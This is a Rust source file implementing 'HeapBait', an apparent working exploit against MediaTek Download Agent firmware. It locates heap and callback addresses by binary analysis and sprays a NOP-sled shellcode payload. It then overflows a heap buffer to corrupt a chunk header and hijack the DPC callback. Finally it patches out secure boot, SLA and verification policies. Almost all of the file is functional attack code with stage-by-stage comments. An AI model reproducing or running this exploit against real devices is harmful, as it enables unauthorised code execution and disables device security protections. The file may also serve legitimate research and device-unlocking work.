/*
    SPDX-License-Identifier: AGPL-3.0-or-later
    SPDX-FileCopyrightText: 2026 Shomy, R0rt1z2
*/

use log::{debug, info, warn};
use xmlcmd_derive::XmlCommand;

use crate::connection::port::ConnectionType;
use crate::da::xml::{XmlCmdLifetime, XmlCommand};
use crate::da::{DA, DAEntryRegion, DAProtocol, Xml};
use crate::error::{Error, Result};
use crate::exploit::{BootStage, Exploit, ExploitMeta, get_v6_payload};
use crate::utilities::analysis::{Aarch64Analyzer, ArchAnalyzer, ArmAnalyzer};
use crate::utilities::arm::force_return as force_return_arm;
use crate::utilities::arm64::force_return as force_return_arm64;
use crate::utilities::patching::{
    HEX_NOT_FOUND,
    bytes_to_hex,
    contains_bytes,
    find_pattern,
    patch_pattern_str,
};

const HAKUJOUDAI: &[u8] = include_bytes!("../../payloads/hakujoudai.bin");
const USB_DATA_SIZE: usize = 0x1400;
const NOP_ARM64: u32 = 0xD503201F;
const NOP_ARM32: u32 = 0xE320F000;
const UART_BASE_PATTERN_ARM64: &str = "a9ff2f36091c0012";
const UART_BASE_PATTERN_ARM32: &str = "XXXXXXE3XX1044E3002091E5142092E5200012E3";

#[derive(XmlCommand)]
struct SecuritySetAllinoneSignature {
    #[xml(tag = "source_file")]
    source_file: String,
}

#[derive(XmlCommand)]
struct ExpCallFunc {
    #[xml(tag = "address", fmt = "0x{address:X}")]
    address: u32,
}

#[derive(XmlCommand)]
struct ExpPatchMem {
    #[xml(tag = "address", fmt = "0x{address:X}")]
    address: u32,
    #[xml(tag = "length", fmt = "0x{length:X}")]
    length: u32,
}

#[derive(Debug, Clone)]
struct HeapParams {
    heap_init_off: usize,
    heap_base: u64,
    heap_size: u64,
    dpc_addr: u64,
    is_arm64: bool,
}

#[derive(Debug, Clone)]
struct HakujoudaiParams {
    uart: u32,
    reg_cmd: u32,
    download: u32,
    free: u32,
    get_node: u32,
    load_str: u32,
    cmd_loop: u32,
    theheap: u32,
}

#[derive(Debug, Default, Clone)]
struct PatchParams {
    secure_cmds: u32,
    vfy_pol: u32,
    dl_pol: u32,
    hash_bind: u32,
    get_hw_sbc: u32,
}

pub struct HeapBait {
    meta: ExploitMeta,
    patched_da2: Option<DAEntryRegion>,
}

fn parse_heap_init(analyzer: &dyn ArchAnalyzer, params: &mut HeapParams) -> Result<()> {
    let pc = analyzer.offset_to_va(params.heap_init_off).unwrap();

    if params.is_arm64 {
        let analyzer64 = analyzer.downcast_ref::<Aarch64Analyzer>().unwrap();
        let instr = analyzer64.read_u32(params.heap_init_off).unwrap();
        let (mut heap_base, rd) = analyzer64.decode_adrp(instr, pc).unwrap();

        let find_add = |start: usize, reg: u8| -> Option<u64> {
            for off in (start..analyzer64.len()).step_by(4) {
                if let Some((rn, rd_add, imm)) =
                    analyzer64.decode_add_imm(analyzer64.read_u32(off).unwrap())
                    && rn == reg
                    && rd_add == reg
                {
                    return Some(imm as u64);
                }
            }
            None
        };

        if let Some(imm) = find_add(params.heap_init_off + 4, rd) {
            heap_base = heap_base.wrapping_add(imm);
        }

        let mut heap_end = 0u64;
        for off in (params.heap_init_off + 4..analyzer64.len()).step_by(4) {
            let instr = analyzer64.read_u32(off).unwrap();
            if let Some((page, rd_adrp)) =
                analyzer64.decode_adrp(instr, analyzer64.offset_to_va(off).unwrap())
                && rd_adrp != rd
            {
                if let Some(imm) = find_add(off + 4, rd_adrp) {
                    heap_end = page.wrapping_add(imm);
                }
                break;
            }
        }

        params.heap_base = heap_base;
        params.heap_size = heap_end.wrapping_sub(params.heap_base);
        return Ok(());
    }
    let analyzer32 = analyzer.downcast_ref::<ArmAnalyzer>().unwrap();
    let mut regs = [0u64; 16];
    let mut heap_base = 0u64;
    let mut heap_size = 0u64;

    // r0 = heap base, r3 = heap end
    for off in (params.heap_init_off..analyzer32.len()).step_by(4) {
        let instr = analyzer32.read_u32(off).unwrap();

        if let Some((rd, imm16)) = analyzer32.decode_movw(instr) {
            regs[rd as usize] = imm16 as u64;
        } else if let Some((rd, imm16)) = analyzer32.decode_movt(instr) {
            regs[rd as usize] |= (imm16 as u64) << 16;
        } else if let Some((rn, rm, rd)) = analyzer32.decode_sub_reg(instr) {
            regs[rd as usize] = regs[rn as usize].wrapping_sub(regs[rm as usize]);
            if heap_base == 0 {
                heap_base = regs[0];
            }
            heap_size = regs[rd as usize];
            break;
        }
    }

    params.heap_base = heap_base;
    params.heap_size = heap_size;

    Ok(())
}

fn find_dpc_address(analyzer: &dyn ArchAnalyzer, params: &mut HeapParams) -> Result<()> {
    let dpc_call_xref = analyzer.find_string_xref("\n@Protocol: DPC CALL\n").unwrap_or_default();
    if dpc_call_xref == 0 {
        return Err(Error::penumbra("Failed to find DPC call string xref"));
    }

    let dprintf_bl = analyzer.get_next_bl_from_off(dpc_call_xref).unwrap(); // find the dprintf BL
    let get_dpc_bl = analyzer.get_next_bl_from_off(dprintf_bl + 4).unwrap(); // find get_cmd_dpc BL (after dprintf)
    let pc = analyzer.get_bl_target(get_dpc_bl).unwrap();
    let get_dpc_off = analyzer.va_to_offset(pc).unwrap();

    if params.is_arm64 {
        let analyzer64 = analyzer.downcast_ref::<Aarch64Analyzer>().unwrap();

        let instr = analyzer64.read_u32(get_dpc_off).unwrap();
        let (dpc_addr, adrp_rd) = analyzer64.decode_adrp(instr, pc).unwrap();
        let (_, add_rd, imm) =
            analyzer64.decode_add_imm(analyzer64.read_u32(get_dpc_off + 4).unwrap()).unwrap();

        let dpc_addr = dpc_addr.wrapping_add(imm as u64).wrapping_sub(8);

        assert_eq!(add_rd, adrp_rd);

        params.dpc_addr = dpc_addr;
        return Ok(());
    }

    let analyzer32 = analyzer.downcast_ref::<ArmAnalyzer>().unwrap();

    let instr = analyzer32.read_u32(get_dpc_off).unwrap();
    let (movw_rd, movw_imm) = analyzer32.decode_movw(instr).unwrap();
    let (movt_rd, movt_imm) =
        analyzer32.decode_movt(analyzer32.read_u32(get_dpc_off + 4).unwrap()).unwrap();

    assert_eq!(movw_rd, movt_rd);

    let dpc_addr = ((movt_imm << 16) | movw_imm) as u64;
    params.dpc_addr = dpc_addr.wrapping_sub(4);

    Ok(())
}

fn find_heap_struct(
    analyzer: &dyn ArchAnalyzer,
    params: &HeapParams,
    haku_params: &mut HakujoudaiParams,
) -> Result<()> {
    if params.is_arm64 {
        let analyzer64 = analyzer
            .downcast_ref::<Aarch64Analyzer>()
            .ok_or_else(|| Error::penumbra("Invalid analyzer for ARM64"))?;

        let next_b = analyzer64.get_next_b_from_off(params.heap_init_off).unwrap_or(0);
        if next_b == 0 {
            return Err(Error::penumbra("Failed to find next B instruction after heap_init"));
        }

        let b_target = analyzer64.get_b_target(next_b).unwrap_or_default();
        let miniheap_init = analyzer64.va_to_offset(b_target).unwrap_or_default();

        let heap_addr = (miniheap_init..miniheap_init + 0x100)
            .step_by(4)
            .find_map(|off| {
                let instr = analyzer64.read_u32(off)?;
                let pc = analyzer64.offset_to_va(off)?;
                let (page, rd) = analyzer64.decode_adrp(instr, pc)?;

                (off + 4..off + 64).step_by(4).find_map(|off2| {
                    let instr2 = analyzer64.read_u32(off2)?;
                    let (rn, rd_add, imm) = analyzer64.decode_add_imm(instr2)?;

                    if rn == rd && rd_add == rd {
                        Some(page.wrapping_add(imm as u64))
                    } else {
                        None
                    }
                })
            })
            .ok_or_else(|| Error::penumbra("Failed to find heap struct pattern"))?;

        haku_params.theheap = heap_addr as u32;
        return Ok(());
    }

    let analyzer32 = analyzer
        .downcast_ref::<ArmAnalyzer>()
        .ok_or_else(|| Error::penumbra("Invalid analyzer for ARM32"))?;

    let mut regs = [0u64; 16];
    let search_end = (params.heap_init_off + 0x80).min(analyzer32.len());

    for off in (params.heap_init_off..search_end).step_by(4) {
        let instr = analyzer32.read_u32(off).unwrap_or(0);

        if let Some((rd, imm16)) = analyzer32.decode_movw(instr) {
            regs[rd as usize] = imm16 as u64;
        }

        if let Some((rd, imm16)) = analyzer32.decode_movt(instr) {
            regs[rd as usize] |= (imm16 as u64) << 16;
        }

        if analyzer32.is_bx_lr(instr) || (instr & 0x0F000000) == 0x0A000000 {
            break;
        }
    }

    haku_params.theheap = regs[1] as u32;

    if haku_params.theheap == 0 {
        return Err(Error::penumbra("Failed to find heap struct address"));
    }

    Ok(())
}

fn find_uart_base(analyzer: &dyn ArchAnalyzer, is_arm64: bool) -> Option<u32> {
    let uart_pattern = if is_arm64 { UART_BASE_PATTERN_ARM64 } else { UART_BASE_PATTERN_ARM32 };
    let off = find_pattern(analyzer.data(), uart_pattern, 0);

    if off == HEX_NOT_FOUND {
        warn!("Could not find UART pattern, using default base");
        return Some(0x11001000);
    }

    if is_arm64 {
        let analyzer64 = analyzer.downcast_ref::<Aarch64Analyzer>()?;

        for scan_off in (off.saturating_sub(0x10)..off).step_by(4) {
            let instr = analyzer64.read_u32(scan_off)?;
            let pc = analyzer64.offset_to_va(scan_off).unwrap_or(0);

            if let Some((page, rd)) = analyzer64.decode_adrp(instr, pc)
                && let Some(next_instr) = analyzer64.read_u32(scan_off + 4)
                && (next_instr & 0xFFC00000) == 0xB9400000
                && ((next_instr >> 5) & 0x1F) as u8 == rd
            {
                let imm12 = ((next_instr >> 10) & 0xFFF) << 2;
                let ptr_addr = page.wrapping_add(imm12 as u64);

                if let Some(ptr_off) = analyzer64.va_to_offset(ptr_addr)
                    && let Some(uart_base) = analyzer64.read_u32(ptr_off)
                {
                    return Some(uart_base);
                }
            }
        }

        warn!("Could not extract UART base from ARM64 pattern, using default");
        return Some(0x11001000);
    }

    // ARM32: pattern matches at movw instruction
    let analyzer32 = analyzer.downcast_ref::<ArmAnalyzer>()?;

    let movw_instr = analyzer32.read_u32(off)?;
    let movt_instr = analyzer32.read_u32(off + 4)?;

    let (rd_w, imm_lo) = analyzer32.decode_movw(movw_instr)?;
    let (rd_t, imm_hi) = analyzer32.decode_movt(movt_instr)?;

    if rd_w != rd_t {
        warn!("Could not find default UART base for ARM, using default");
        return Some(0x11002000);
    }

    let ptr_addr = ((imm_hi << 16) | imm_lo) as u64;
    let ptr_off = analyzer32.va_to_offset(ptr_addr)?;

    analyzer32.read_u32(ptr_off)
}

fn extract_heap_params(analyzer: &dyn ArchAnalyzer, is_arm64: bool) -> Result<HeapParams> {
    let da_enter_xref = analyzer.find_string_xref("\n***Enter 2nd-DA.***\n").unwrap_or_default();
    if da_enter_xref == 0 {
        return Err(Error::penumbra("Failed to find DA enter string xref"));
    }

    let heap_init_bl = da_enter_xref.saturating_sub(4 * if is_arm64 { 12 } else { 11 });
    let heap_init = analyzer.get_bl_target_offset(heap_init_bl).unwrap_or_default();
    if heap_init == 0 {
        return Err(Error::penumbra("Failed to find heap init function"));
    }

    debug!("Heap init function at offset 0x{:X}", heap_init);

    let mut params =
        HeapParams { heap_init_off: heap_init, heap_base: 0, heap_size: 0, dpc_addr: 0, is_arm64 };

    parse_heap_init(analyzer, &mut params)?;
    find_dpc_address(analyzer, &mut params)?;

    Ok(params)
}

fn extract_hakujoudai_params(
    analyzer: &dyn ArchAnalyzer,
    is_arm64: bool,
) -> Result<HakujoudaiParams> {
    let download_function_off =
        analyzer.find_function_from_string("Download host file:%s").unwrap_or_default();
    let download_addr = analyzer.offset_to_va(download_function_off).unwrap_or_default() as u32;

    debug!("Download function at offset 0x{:X}, VA 0x{:X}", download_function_off, download_addr);

    let off = analyzer.find_string_xref("CMD:REBOOT").unwrap_or_default();
    let bl_off = analyzer.get_next_bl_from_off(off).unwrap_or_default();
    let reg_cmd_addr = analyzer.get_bl_target(bl_off).unwrap_or_default() as u32;

    debug!("Reg CMD function at VA 0x{:X}", reg_cmd_addr);

    let off = analyzer.find_string_xref("Bad %s").unwrap_or_default();
    let bl1 = analyzer.get_next_bl_from_off(off).unwrap_or_default();
    let bl2 = analyzer.get_next_bl_from_off(bl1 + 4).unwrap_or_default();
    let free_addr = analyzer.get_bl_target(bl2).unwrap_or_default() as u32;

    debug!("Free function at VA 0x{:X}", free_addr);

    let load_string_off = analyzer.find_function_start_from_off(off).unwrap_or_default();
    let load_str_addr = analyzer.offset_to_va(load_string_off).unwrap_or_default() as u32;

    debug!("mxml_load_string function at VA 0x{:X}", load_str_addr);
    let off = analyzer.find_string_xref("runtime_switchable_config/magic").unwrap_or_default();
    let bl_off = analyzer.get_next_bl_from_off(off).unwrap_or_default();
    let gettext_addr = analyzer.get_bl_target(bl_off).unwrap_or_default() as u32;

    debug!("gettext function at VA 0x{:X}", gettext_addr);

    let off = analyzer.find_function_from_string("\n@Protocol: DPC CALL\n").unwrap_or_default();
    let cmd_loop_addr = analyzer.offset_to_va(off).unwrap_or_default() as u32;

    debug!("Command loop function at VA 0x{:X}", cmd_loop_addr);

    let uart_base = find_uart_base(analyzer, is_arm64).unwrap_or(0x11001000);

    debug!("Uart base at 0x{:X}", uart_base);

    Ok(HakujoudaiParams {
        uart: uart_base,
        reg_cmd: reg_cmd_addr,
        download: download_addr,
        free: free_addr,
        get_node: gettext_addr,
        load_str: load_str_addr,
        cmd_loop: cmd_loop_addr,
        theheap: 0,
    })
}

fn extract_patch_params(analyzer: &dyn ArchAnalyzer) -> Option<PatchParams> {
    const POLICY_FUNC: &str = "==========security policy==========";
    const SBC_FUNC: &str = "[SBC] sbc_en = %d\n";

    let register_all_cmds_off = analyzer.find_function_from_string("CMD:REBOOT")?;
    let secure_cmds = analyzer.offset_to_va(register_all_cmds_off)? as u32;

    let part_sec_pol_off = analyzer.find_function_from_string(POLICY_FUNC)?;
    let policy_idx_bl = analyzer.get_next_bl_from_off(part_sec_pol_off)?;
    let verify_bl = analyzer.get_next_bl_from_off(policy_idx_bl + 4)?;
    let download_bl = analyzer.get_next_bl_from_off(verify_bl + 4)?;
    let hash_bind_bl = analyzer.get_next_bl_from_off(download_bl + 4)?;

    let vfy_pol = analyzer.get_bl_target(verify_bl)? as u32;
    let dl_pol = analyzer.get_bl_target(download_bl)? as u32;
    let hash_bind = analyzer.get_bl_target(hash_bind_bl)? as u32;

    let sec_func = analyzer.find_function_from_string(SBC_FUNC)?;
    let get_log_level = analyzer.get_next_bl_from_off(sec_func)?;
    let get_hw_sbc_bl = analyzer.get_next_bl_from_off(get_log_level + 4)?;
    let get_hw_sbc = analyzer.get_bl_target(get_hw_sbc_bl)? as u32;

    Some(PatchParams { secure_cmds, vfy_pol, dl_pol, hash_bind, get_hw_sbc })
}

fn build_shellcode_payload(params: &HakujoudaiParams, heap: &HeapParams) -> Option<Vec<u8>> {
    let nop = if heap.is_arm64 { NOP_ARM64 } else { NOP_ARM32 };
    let nop_count = ((heap.heap_size / 10) / 4) as usize;
    let mut payload_bin = get_v6_payload(HAKUJOUDAI, heap.is_arm64).to_vec();

    patch_pattern_str(&mut payload_bin, "11111111", &bytes_to_hex(&params.reg_cmd.to_le_bytes()))?;
    patch_pattern_str(&mut payload_bin, "22222222", &bytes_to_hex(&params.cmd_loop.to_le_bytes()))?;
    patch_pattern_str(&mut payload_bin, "33333333", &bytes_to_hex(&params.theheap.to_le_bytes()))?;
    patch_pattern_str(&mut payload_bin, "44444444", &bytes_to_hex(&params.download.to_le_bytes()))?;
    patch_pattern_str(&mut payload_bin, "55555555", &bytes_to_hex(&params.free.to_le_bytes()))?;
    patch_pattern_str(&mut payload_bin, "66666666", &bytes_to_hex(&params.get_node.to_le_bytes()))?;
    patch_pattern_str(&mut payload_bin, "77777777", &bytes_to_hex(&params.load_str.to_le_bytes()))?;
    patch_pattern_str(&mut payload_bin, "88888888", &bytes_to_hex(&params.uart.to_le_bytes()))?;

    let mut payload = Vec::with_capacity(nop_count * 4 + payload_bin.len());

    for _ in 0..nop_count {
        payload.extend_from_slice(&nop.to_le_bytes());
    }
    payload.extend_from_slice(&payload_bin);

    Some(payload)
}

impl Default for HeapBait {
    fn default() -> Self {
        Self::new()
    }
}

impl HeapBait {
    pub fn new() -> Self {
        HeapBait {
            meta: ExploitMeta {
                name: String::from("HeapBait"),
                boot_mode: vec![ConnectionType::Brom, ConnectionType::Preloader],
                boot_stage: BootStage::Da2,
            },
            patched_da2: None,
        }
    }

    pub fn get_patched_da2(&self) -> Option<&DAEntryRegion> {
        self.patched_da2.as_ref()
    }

    async fn extract_params(&self, da: &DA) -> Result<(HeapParams, HakujoudaiParams, PatchParams)> {
        let is_arm64 = da.is_arm64();
        let da2 = da.get_da2().ok_or_else(|| Error::penumbra("DA2 entry not found"))?;
        let data = &da2.data;
        let addr = da2.addr as u64;

        let analyzer = if is_arm64 {
            Box::new(Aarch64Analyzer::new(data.clone(), addr)) as Box<dyn ArchAnalyzer>
        } else {
            Box::new(ArmAnalyzer::new(data.clone(), addr)) as Box<dyn ArchAnalyzer>
        };

        let heap_params = extract_heap_params(analyzer.as_ref(), is_arm64)?;
        let mut hakujoudai_params = extract_hakujoudai_params(analyzer.as_ref(), is_arm64)?;
        find_heap_struct(analyzer.as_ref(), &heap_params, &mut hakujoudai_params)?;
        let patch_params = extract_patch_params(analyzer.as_ref()).unwrap_or_default();

        Ok((heap_params, hakujoudai_params, patch_params))
    }

    // The two vulnerabilities were fixed on the same ALPS patch
    async fn is_vulnerable(&self, da: &DA) -> bool {
        let da2 = match da.get_da2() {
            Some(d) => d,
            None => return false,
        };

        contains_bytes(&da2.data, b"Dest XML file name buffer overflow") == HEX_NOT_FOUND
    }

    async fn patch_mem(&self, xml: &mut Xml, addr: u32, data: &[u8]) -> Result<()> {
        let cmd = ExpPatchMem { address: addr, length: data.len() as u32 };
        xml.send_cmd(&cmd).await?;
        xml.download_file(data.len(), data, &mut |_, _| {}).await?;
        xml.lifetime_ack(XmlCmdLifetime::CmdEnd).await?;
        Ok(())
    }

    async fn patch_da(
        &self,
        xml: &mut Xml,
        da: &DA,
        params: &PatchParams,
        is_arm64: bool,
    ) -> Result<()> {
        let da2 = da.get_da2().ok_or_else(|| Error::penumbra("DA2 entry not found"))?;
        // Check for the DA.SLA\0eENABLED string to decide if we need to patch the security
        let sla_off = contains_bytes(&da2.data, b"DA.SLA\0ENABLED");
        let sla_enabled = sla_off != HEX_NOT_FOUND;
        let mut should_register: bool;

        should_register = contains_bytes(&da2.data, b"mot_sec") != HEX_NOT_FOUND;

        if sla_enabled {
            info!("[Exploit] SLA is enabled, patching to disable...");
            let patch = b"DA.SLA\0DISABLE";
            self.patch_mem(xml, da2.addr + sla_off as u32, patch).await?;
            should_register = true;
            info!("[Exploit] SLA disabled.");
        }

        let mut force_return = [0u8; 8];

        if is_arm64 {
            force_return_arm64(&mut force_return, 0, 0)?;
        } else {
            force_return_arm(&mut force_return, 0, 0, false)?;
        }

        info!("[Exploit] Patching security policies...");
        self.patch_mem(xml, params.vfy_pol, &force_return).await?;
        info!("[Exploit] Patched verify policy.");
        self.patch_mem(xml, params.dl_pol, &force_return).await?;
        info!("[Exploit] Patched download policy.");
        self.patch_mem(xml, params.hash_bind, &force_return).await?;
        info!("[Exploit] Patched hash bind policy.");
        self.patch_mem(xml, params.get_hw_sbc, &force_return).await?;
        info!("[Exploit] Patched SBC to be disabled.");

        // We re-register all cmds regardless of DA-SLA just to be sure.
        // On some OEMs like moto, some CMDs are blocked behind some flags
        // (i.e secure boot)
        if should_register {
            xml.send_cmd(&ExpCallFunc::new(params.secure_cmds)).await?;
            xml.lifetime_ack(XmlCmdLifetime::CmdEnd).await?;
        }

        Ok(())
    }
}

#[async_trait::async_trait]
impl Exploit for HeapBait {
    async fn run(&mut self, protocol: &mut dyn DAProtocol) -> Result<bool> {
        let proto = protocol
            .as_any_mut()
            .downcast_mut::<Xml>()
            .ok_or_else(|| Error::penumbra("Failed to downcast to XML protocol"))?;

        let da = proto.get_da().clone();

        if !self.is_vulnerable(&da).await {
            return Ok(false);
        }

        let (heap_params, haku_params, patch_params) = match self.extract_params(&da).await {
            Ok(p) => p,
            Err(e) => {
                warn!("HeapBait: {}", e);
                return Ok(false);
            }
        };

        info!("[Exploit] Device is vulnerable to HeapBait!");

        let payload_bin = build_shellcode_payload(&haku_params, &heap_params);

        if payload_bin.is_none() {
            warn!("HeapBait: Failed to prepare hakujoudai payload");
            return Ok(false);
        }

        let hakujoudai = payload_bin.unwrap();

        debug!(
            "[Exploit] Heap params: base=0x{:X}, size=0x{:X}, dpc=0x{:X}",
            heap_params.heap_base, heap_params.heap_size, heap_params.dpc_addr
        );

        debug!(
            "[Exploit] Hakujoudai params: reg_cmd=0x{:X}, download=0x{:X}, free=0x{:X}, get_node=0x{:X}, load_str=0x{:X}, cmd_loop=0x{:X}, theheap=0x{:X}",
            haku_params.reg_cmd,
            haku_params.download,
            haku_params.free,
            haku_params.get_node,
            haku_params.load_str,
            haku_params.cmd_loop,
            haku_params.theheap
        );

        // We create a big NOP sled in the heap (about 10% of heap size) to increase
        // the chances of landing on our shellcode. The shellcode is placed at the
        // end of the sled.
        let sled_size = (heap_params.heap_size / 10) as usize;
        // Land at 95% into sled (4-byte aligned for ARM)
        let shellcode_addr = (heap_params.heap_base + (sled_size as f64 * 0.95) as u64) & !3;

        debug!("[Exploit] Shellcode addr: 0x{:X} (sled size: 0x{:X})", shellcode_addr, sled_size);

        info!("[Exploit] Sending Hakujoudai...");

        // Stage 1: Upload shellcode payload to the heap via AIO1.
        // This creates a large allocation containing a NOP sled followed by the
        // actual shellcode (hakujoudai). The shellcode lands somewhere in the heap.
        let cmd = SecuritySetAllinoneSignature::new("aio.bin");
        proto.send_cmd(&cmd).await?;
        proto.download_file(hakujoudai.len(), &mut hakujoudai.as_slice(), &mut |_, _| {}).await?;
        proto.lifetime_ack(XmlCmdLifetime::CmdEnd).await?;

        info!("[Exploit] Hakujoudai landed (size: 0x{:X} bytes)", hakujoudai.len());

        // Stage 2: Heap shaping via AIO2 command with large filename.
        // When mxmlLoadString parses the XML command, it allocates a buffer for
        // the filename (5000 A's). This buffer will be allocated right after
        // the AIO2 data buffer we're about to overflow.
        //
        // Heap layout after this stage:
        // [AIO1 shellcode buffer] ... [AIO2 data buffer (0x1410)] [XML filename buffer (0x13a0)]
        let cmd = SecuritySetAllinoneSignature::new("A".repeat(5000));
        proto.send_cmd(&cmd).await?;
        proto.read_data().await?;
        proto.ack(None).await?;

        // Stage 3: Trigger the heap overflow.
        // We advertise 0x13FC bytes, so the DA allocates a 0x1400 byte buffer.
        // However, fp_read_host_file has a bug: it reads packet_length (0x2000)
        // bytes per chunk without checking remaining capacity.
        //
        // By sending 0x1410 bytes total, we overflow 0x10 bytes past the buffer,
        // corrupting the next chunk's allocated header (the XML filename buffer).
        //
        // The overflow overwrites the alloc_struct_begin header:
        //   ARM64: ptr (8 bytes) | size (8 bytes)
        //   ARM32: magic (4 bytes) | ptr (4 bytes) | size (4 bytes)
        //
        // We set:
        //   ptr  = dpc_addr (points 0x10/0x8 bytes before dpc->cb)
        //   size = shellcode_addr
        let mut payload2 = vec![0u8; USB_DATA_SIZE];

        // Write the fake chunk header that will overwrite the XML filename buffer's header
        // ARM64 header: ptr (8 bytes) | size (8 bytes)
        // ARM32 header: magic (4 bytes) | ptr (4 bytes) | size (4 bytes)
        if heap_params.is_arm64 {
            payload2.extend_from_slice(&heap_params.dpc_addr.to_le_bytes());
            payload2.extend_from_slice(&shellcode_addr.to_le_bytes());
        } else {
            payload2.extend_from_slice(&0xDEADBEEFu32.to_le_bytes()); // this is ignored
            payload2.extend_from_slice(&(heap_params.dpc_addr as u32).to_le_bytes());
            payload2.extend_from_slice(&(shellcode_addr as u32).to_le_bytes());
        }

        proto.ack(format!("{:x}", USB_DATA_SIZE - 4).into()).await?;
        proto.read_ack().await?;
        proto.ack("0".to_string().into()).await?;
        proto.read_ack().await?;
        proto.send(&payload2).await?;
        proto.read_ack().await?;

        // Stage 4: Abort the transfer to trigger cleanup.
        // This causes mxmlDelete to free all XML nodes, including the filename
        // buffer with the corrupted header.
        //
        // When free() is called on the corrupted chunk, it does:
        //   ARM64: ldp x8, x9, [ptr, #-0x10]  ->  x8 = our ptr, x9 = our size
        //          str x9, [x8, #0x10]        ->  writes shellcode_addr to dpc->cb
        //   ARM32: ldmdb r4, {r0, r1}         ->  r0 = our ptr, r1 = our size
        //          str r1, [r0, #0x8]         ->  writes shellcode_addr to dpc->cb
        //
        // This overwrites dpc->cb with the shellcode address :)
        proto.send("GETBAITED\0".as_bytes()).await?;
        proto.read_ack().await.ok();
        proto.lifetime_ack(XmlCmdLifetime::CmdEnd).await.ok();

        // Stage 5: The DA's command loop checks dpc->cb after each command.
        // Since we just wrote the shellcode address there, it calls our code!
        info!("[Exploit] Hakujoudai is haunting the heap @ 0x{:X}", shellcode_addr);

        self.patch_da(proto, &da, &patch_params, heap_params.is_arm64).await?;

        info!("[Exploit] The heap took the bait. Enjoy ;)");

        Ok(true)
    }

    fn get_meta(&self) -> &ExploitMeta {
        &self.meta
    }

    // HeapB8 doesn't modify the DA itself
    fn get_patched_da(&self) -> Option<DA> {
        None
    }
}
